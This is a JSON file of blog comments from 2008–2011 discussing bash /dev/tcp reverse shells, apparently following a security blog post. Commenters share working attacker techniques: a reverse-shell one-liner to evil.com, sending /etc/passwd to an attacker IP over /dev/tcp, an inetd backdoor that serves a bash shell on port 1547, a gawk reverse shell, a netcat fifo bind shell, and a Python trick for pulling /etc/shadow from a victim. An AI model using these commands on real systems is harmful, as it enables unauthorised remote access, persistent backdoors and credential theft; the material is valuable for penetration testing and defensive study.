@@ -1,0 +1,296 @@
+[
+  {
+    "author": "Adrian 'pagvac' Pastor",
+    "avatar": "ef14ae4ef69235fa6c3709438357819d",
+    "date": "2008-04-19T12:17:45.000Z",
+    "content": "This is the kind of stuff I like. As we tend to say: \"there is always an easier way to solve the problem\"."
+  },
+  {
+    "author": "ernie",
+    "avatar": "18067dcaf3d81bfd125eefc797c20e5e",
+    "date": "2008-04-19T13:28:37.000Z",
+    "content": "This shit doesn't work everywhere, you need to have compiled support in bash for it, and since it's very broken, most distributions do not ship bash enabled with this feature."
+  },
+  {
+    "author": "Anonymous",
+    "avatar": "01822efaf66e4b81d6f947cba7e0613a",
+    "date": "2008-04-19T14:00:07.000Z",
+    "content": "Nice, but I preferred the original write-up ;) http://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/"
+  },
+  {
+    "author": "Tecky",
+    "avatar": "d489a8c17c4e9796fbe57a8f10073511",
+    "date": "2008-04-19T14:16:59.000Z",
+    "content": "To bad is not working on debian distributions."
+  },
+  {
+    "author": "dude dyde",
+    "avatar": "d1b4bb13f49bd2d1c061d33109f9962f",
+    "date": "2008-04-19T14:21:23.000Z",
+    "content": "give credit where its due.  this was posted yesterday on some other sites prior."
+  },
+  {
+    "author": "kcghost",
+    "avatar": "3e8f21136dcd2cafc2e684fd1546c45f",
+    "date": "2008-04-19T14:38:23.000Z",
+    "content": "a cool trick, but is there a convenient way of doing this in debian? Debian doesnt have the \"/dev/tcp\" feature as part of its bash by default, is there a way to get around that and use something else?"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-04-19T14:43:19.000Z",
+    "content": "first of all, I find this feature working on far too many systems. Second, similar things can be done with TCL and 3rd, I don't read every single blog out there to know that someone has blogged about it as well, neither I claim that it is new. If someone has posted similar technique somewhere else, it is just a coincidence. On another note, giving credits for something like this, is a bit stupid. :) It is like giving credits to someone for writing a <q>for</q> loop in bash. This is a feature not an ingenious hack. Also, my example significantly differs from the example provided by the blog post suggested above. thanks for the heads up and apologies to those who think that I have ripped off their work. It is certainly not the case."
+  },
+  {
+    "author": "otze",
+    "avatar": "b28d5fe8da784e36235a487c03a47353",
+    "date": "2008-04-19T14:44:19.000Z",
+    "content": "Nice one, but on my system the man page of bash states the following: :( NOTE: Bash, as packaged for Debian, does not support using the /dev/tcp and /dev/udp files."
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-04-19T14:45:42.000Z",
+    "content": "if you don't have this feature compiled you can use TCL which is most likely installed on the system. Now, this defeats the purpose of the technique presented here but it might be better in some situations when you are restricted in terms of being able to upload netcat for example. For more information on using TCL socket features, read the following link: http://www.tcl.tk/man/tcl8.4/TclCmd/socket.htm"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-04-19T14:53:59.000Z",
+    "content": "otze, unfortunately Debian does not support it. keep in mind that Debian mainly uses very old <q>stable</q> packages. Which is good and bad at the same time."
+  },
+  {
+    "author": "Venom23",
+    "avatar": "c65f2a23045a747655b93b343d1f5000",
+    "date": "2008-04-19T16:10:35.000Z",
+    "content": "You are my idol #1"
+  },
+  {
+    "author": "Venom23",
+    "avatar": "c65f2a23045a747655b93b343d1f5000",
+    "date": "2008-04-19T16:22:00.000Z",
+    "content": "Yes! Works fine on Solaris 9 and 10. Always had problems getting a netcat compiled on Solaris. Hate gcc problems on Solaris. The netcat version provided by sunfreeware.com does not include the \"-e\" option for bidirectional communication."
+  },
+  {
+    "author": "Sam",
+    "avatar": "a47fd875e50eda99c98b3160ec3df5ba",
+    "date": "2008-04-20T05:37:33.000Z",
+    "content": "I tried this on a ubuntu server and it does not work  in it's default configuration. If you build the bash using the use --enable-net-redirections build flag it will work. Just in case someone else was wondering why it wouldn't work."
+  },
+  {
+    "author": "Adri",
+    "avatar": "2ed1cf60e18830bcdff9bf232faee040",
+    "date": "2008-04-20T19:06:51.000Z",
+    "content": "Nice stuff, I really love this website :D"
+  },
+  {
+    "author": "Jim Kelly",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-20T20:35:35.000Z",
+    "content": "I checked the bash man page on Mac OS X 10.5.2 and it DOES support <code>/dev/tcp</code>!!\r\n\r\njk"
+  },
+  {
+    "author": "Jim Kelly",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-20T20:45:39.000Z",
+    "content": "I just tried it on Mac OS X Leopard and it works!! caveat I connected to and from localhost so my next test, time willing will be to try to/from another host. Nothing shows up on the victim host, all std out shows up on attacker side ;-) pdp awesome awesome tip!!!"
+  },
+  {
+    "author": "Yash Kadakia",
+    "avatar": "779cb6e06b596400446c3076bb13785a",
+    "date": "2008-04-20T20:59:29.000Z",
+    "content": "Thanks for the tip! Its an interesting concept to minimize the footprint on the client machine."
+  },
+  {
+    "author": "tix",
+    "avatar": "6125da169bce604fdf9bd2d55233e5bc",
+    "date": "2008-04-20T21:05:17.000Z",
+    "content": "you can remove the <code>cat &lt;&amp;5</code>, will be:\n\n<pre><code>while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre>\n\nthere is also the <code>$REPLY</code> var of the read builtin command.\n\nthnks for the stuff gnucitizen."
+  },
+  {
+    "author": "nicolasfr",
+    "avatar": "6c6d4834c788c4a760b164e358245d5d",
+    "date": "2008-04-21T07:38:03.000Z",
+    "content": "Why using two lines/commands? A one liner version:\n\n<pre><code>$ bash -i &gt;&amp; /dev/tcp/evil.com/8080 0&gt;&amp;1</code></pre>\n\nNote: <code>/dev/tcp</code> support is enabled by default on Redhat. Disabled on Debian. Would be nice to list here support for other well known distro (Suse?)."
+  },
+  {
+    "author": "Jim Kelly",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-21T21:45:39.000Z",
+    "content": "Ok here is an idea of how to turn this into a port scanner: Say you are on box 192.168.1.2 and you want to port scan ports 79,80,81 on 192.168.1.1 do the following all on one line:\n\n<pre><code>for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>\n\nWhat you end up with is something like this:\n\n<pre><code>bash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done\n[1] 5579\n79\nbash: connect: Connection refused\nbash: /dev/tcp/192.168.1.1/79: Connection refused\n[1]+  Done                    echo $i\n[1] 5581\n80\n[1]+  Done                    echo $i\n[1] 5584\n81\nbash: connect: Connection refused\nbash: /dev/tcp/192.168.1.1/81: Connection refused\n[1]+  Done                    echo $i\nbash-3.2$ for i in 79 80 81; do echo $i &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/$i 0&gt;&amp;1;done</code></pre>\n\nClosed ports give you back a \"Connection refused\""
+  },
+  {
+    "author": "Jim Kely",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-21T22:01:28.000Z",
+    "content": "LOL Google is truely my friend: http://www.oreilly.com/pub/h/5299 A tcp and udp portscanner implimented in Bash ;-)"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-04-22T05:11:55.000Z",
+    "content": "sweet!"
+  },
+  {
+    "author": "Marchiner",
+    "avatar": "564e44b6b33cc73b9bb444ea8f22694c",
+    "date": "2008-04-22T14:15:16.000Z",
+    "content": "It works ok on debian, but only using TCL! :D But works fine! Thx for nice post pdp!"
+  },
+  {
+    "author": "Marchiner",
+    "avatar": "564e44b6b33cc73b9bb444ea8f22694c",
+    "date": "2008-04-22T14:51:39.000Z",
+    "content": "Ops sorry.. really don work on debian. Works on Redhat Enterprise 4 and 5."
+  },
+  {
+    "author": "Marchiner",
+    "avatar": "564e44b6b33cc73b9bb444ea8f22694c",
+    "date": "2008-04-22T15:02:48.000Z",
+    "content": "Just to complement... i know this post its about the reverse shell.  But \"debian users\" whatch this post about Default-bash:/dev/tcp http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=146464"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-23T09:18:55.000Z",
+    "content": "Marchiner: wow this bug report goes back to 2002! How much longer till it's fixed ;-)"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-23T21:55:58.000Z",
+    "content": "Ok this is off scope for this thread, and the moderator may not want it but here's a way to use /dev/tcp to banner a web server:\r\n\r\n<pre><code>#!/bin/bash\r\nexec 3&lt;&gt;/dev/tcp/$1/80\r\necho -e \"Get /simple?se=1 HTTP/1.0\\n\" &gt;&amp;3\r\ncat &lt;&amp;3</code></pre>\r\n\r\nYou'd feed the www.whatever.com on the command line.\r\n \r\nusage:\r\n\r\n<pre><code>./script www.whatever.com</code></pre>"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-04-26T14:56:58.000Z",
+    "content": "Correction: script should read:\n\n<pre><code>#!/bin/bash\nexec 3 /dev/tcp/$1/80\necho -e \"Get /simple?se=1 HTTP/1.0\\n\" &gt;&amp;3\ncat &lt;&amp;3</code></pre>"
+  },
+  {
+    "author": "f0rg3",
+    "avatar": "8150b9645442ee255c68ec036085fdff",
+    "date": "2008-04-29T23:09:57.000Z",
+    "content": "Useful, Thanks."
+  },
+  {
+    "author": "PsyEcho",
+    "avatar": "f3b0b062823d93fc92c37594e4b2c8af",
+    "date": "2008-05-03T10:31:13.000Z",
+    "content": "Thanks 'pdp'. Nice concept &amp; article. Though doesn't work for my default Debian base, but surely gonna come handy for research! Kudos and keep up the good work :) Cheers."
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-03T12:09:06.000Z",
+    "content": "PDP Yeh this was old school goodness ;-) I love the idea of using what's already there. Now what I'd like is an equivalent on windows!"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-05-03T12:15:01.000Z",
+    "content": "unfortunately batch is very limited but you can do similar things with WScript combined with JavaScript(JScript) or VBScript. These stuff come by default on every Windows operating system."
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-03T13:28:40.000Z",
+    "content": "pdp\n\nthanks for pointing me in the right direction ;-) Mr. Google sez: http://www.codeproject.com/KB/cs/ReverseRAT.aspx\n\nLOL\nAwesome!"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-05T23:45:26.000Z",
+    "content": "Fun and games with <code>/dev/tcp</code> and file transfer: Ok here is how to use this bash <code>/dev/tcp</code> trick to move a file.\n\n<ol>\n<li>On attacker's box: I want to move a file named test.txt to the victim box<pre><code>cat test.txt | nc -l 3333</code></pre></li>\n<li>I'll then connect out from victim to attacker's port 3333 and pull back the file <code>test.txt</code><pre><code>bash -i &gt;&amp; /dev/tcp/attackersIP/8080 0&gt;&amp;1 &gt; test.txt</code></pre></li>\n</ol>\n\nAdvantages: netcat stays on the attacker's box. All I use on the victim box is what's already there...bash ;-)\n\n--------------------------------------\n\nok so you are probably saying \"That's nice\" but if I'm already on the victim and I want to say transfer /etc/password or /etc/shadow back to my attacker's box and I'm too lazy to do terminal copy and paste...then what?\n\n<ol>\n<li>on attacker's box do<pre><code>nc -l -p 8080 -vvv &gt; passwd</code></pre></li>\n<li>on victim box do<pre><code>cat /etc/passwd &gt; /dev/tcp/attackerIP/8080</code></pre></li>\n</ol>\n\nand like magic the victim's /etc/password is transferred to the attacker's box."
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-06T09:36:27.000Z",
+    "content": "Transfer a file using HTTP: Say you have compromised a victim box and want to transfer a file to the victim. \n\n1. Put the file in the web root of the attacker box (I'm thinking of the web server in backtrack.\n2. Start up the web server on the attacker box\n3. On the victim box do:\n\n<pre><code>(echo -e \"GET /filename_you_are_moving HTTP/0.9\\r\\n\\r\\n\" \\\n1&gt;&amp;3 &amp; cat 0&lt;&amp;3) 3 /dev/tcp/AttackerIP/80 \\\n| (read i; while [ \"$(echo $i | tr -d '\\r')\" != \"\" ]; \\\ndo read i; done; cat) &gt; local_filename</code></pre>\n\nCredit where credit is due:\nhttp://www.pebble.org.uk/linux/bashbrowser"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "2b126676a67d146691c4d3b0de4c8db0",
+    "date": "2008-05-09T19:44:37.000Z",
+    "content": "Here is an important thing I just realized...d'oh this /dev/tcp/ thing can only connect outbound, it cannot listen and receive a connection like netcat. As far as I can tell ;-)"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-24T13:05:14.000Z",
+    "content": "BTW the /dev/tcp and /dev/udp is also a feature of the Korn shell. Korn shell is robust shell favored by *nix oldskoolers. You will find it installed by default on Mac OS X. I don't believe it comes default on the remainder of the BSDs(free and open). As far as I can tell it works pretty much the way it does under Bash."
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-25T19:15:40.000Z",
+    "content": "Ok here's some old skool stuff. To create a listener on a *nix box running inetd (as apposed to xinetd)\r\n\r\n<ul>\r\n<li>Pick an obscure service from <code>/etc/services</code> associated with a tcp port 1024 and above...for example laplink <pre><code>laplink         1547/tcp     # laplink</code></pre></li>\r\n<li>Add the following line to <code>/etc/inetd.conf</code> <pre><code>laplink    stream  tcp     nowait  /bin/bash bash -i</code></pre></li>\r\n<li>restart <code>inetd.conf</code> <pre><code>killall -HUP inetd</code></pre></li>\r\n</ul>\r\n\r\n<strong>Explaination:</strong> You are creating a listener on port tcp/1547 that will shovel you a bash shell.\r\n\r\n<strong>Caveat:</strong> this obviously is not my *idea* It's just very VERY old stuff that still works."
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-05-30T22:52:44.000Z",
+    "content": "Ok I know I know I'm obsessive ;-) Here is a reverse shell implemented in gawk\r\n\r\nCredit: Phrack 62\r\n\r\n<pre><code>#!/usr/bin/gawk -f\r\n\r\nBEGIN {\r\n        Port    =       8080\r\n        Prompt  =       \"bkd&gt; \"\r\n\r\n        Service = \"/inet/tcp/\" Port \"/0/0\"\r\n        while (1) {\r\n                do {\r\n                        printf Prompt |&amp; Service\r\n                        Service |&amp; getline cmd\r\n                        if (cmd) {\r\n                                while ((cmd |&amp; getline) &gt; 0)\r\n                                        print $0 |&amp; Service\r\n                                close(cmd)\r\n                        }\r\n                } while (cmd != \"exit\")\r\n                close(Service)\r\n        }\r\n}</pre></code>"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-06-01T16:34:36.000Z",
+    "content": "Yes exact citation for above is p62-0x08_Remote_Exec.txt \"FIST! FIST! FIST! Its all in the wrist: Remote Exec\" by grugg"
+  },
+  {
+    "author": "macubergeek",
+    "avatar": "5e10822e3d033324c2a0f8fecf2450cc",
+    "date": "2008-06-01T16:37:33.000Z",
+    "content": "Python Trick\n\nIf you can use a web app to execute shell commands on the victim:\n\n<pre><code>cd / &amp;&amp; python -m SimpleHTTPServer</code></pre>\n\nthen\n\nPython will start it's own web server listening on port 8000. You can surf to the victim on that port: <code>http://victim:8000</code> and then transverse the entire file system and download <code>/etc/passwd</code> and <code>/etc/shadow</code>.\n\nTested on macos x 10.5.3 and Safari 3.1.1. For other *nix variants, your mileage may vary."
+  },
+  {
+    "author": "edward baddouh",
+    "avatar": "f5ccc3e8b23493df26861d148cd93815",
+    "date": "2008-09-16T22:46:29.000Z",
+    "content": "nice work pdp, keep on going!"
+  },
+  {
+    "author": "vecna",
+    "avatar": "6553298663f3ce100c6163e6f926980b",
+    "date": "2008-11-10T09:53:42.000Z",
+    "content": "http://www.delirandom.net/20080323/ping-is-the-most-deployed-backdoor-on-the-net-omg/ the same prerequisite, but traffic is encoded in icmp."
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2008-11-10T09:58:32.000Z",
+    "content": "this is quite interesting. thanks for sharing."
+  },
+  {
+    "author": "Jeff Price",
+    "avatar": "405305d505e5f3191e29a5db057fbcdf",
+    "date": "2009-06-17T17:58:49.000Z",
+    "content": "2 way /dev/tcp communication on debian. Use netcat\n\n<pre><code>mkfifo mypipe\ncat mypipe|/bin/bash|nc -l -p 6000 &gt;mypipe</code></pre>"
+  },
+  {
+    "author": "pagvac",
+    "avatar": "0367b81839d31a5fa3d7bea79ef71b9e",
+    "date": "2009-06-25T12:19:06.000Z",
+    "content": "@Jeff: awesome. just tested it on my ubuntu workstation and works like a charm. thanks for sharing!"
+  },
+  {
+    "author": "revtan",
+    "avatar": "3158cf408532b750f5ba4783447d0b83",
+    "date": "2010-04-07T01:43:57.000Z",
+    "content": "thanks for nice article...\n\n<pre><code>(macubergeek == pdp)  ? ;-P : ;-|</code></pre>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2010-09-26T20:11:06.000Z",
+    "content": "not really! :)"
+  },
+  {
+    "author": "Guy",
+    "avatar": "42aafcdfd5d741de9b581d215c696c91",
+    "date": "2011-02-18T11:03:18.000Z",
+    "content": "I doubt whether this can be correct. \n\nThe man page of nc mentions this w.r.t. to the <code>-l</code> option\": \"It is an error to use this <code>[l-]</code> option in conjunction with the <code>-p</code>, <code>-s</code>, or <code>-z</code> options.\""
+  }
+]
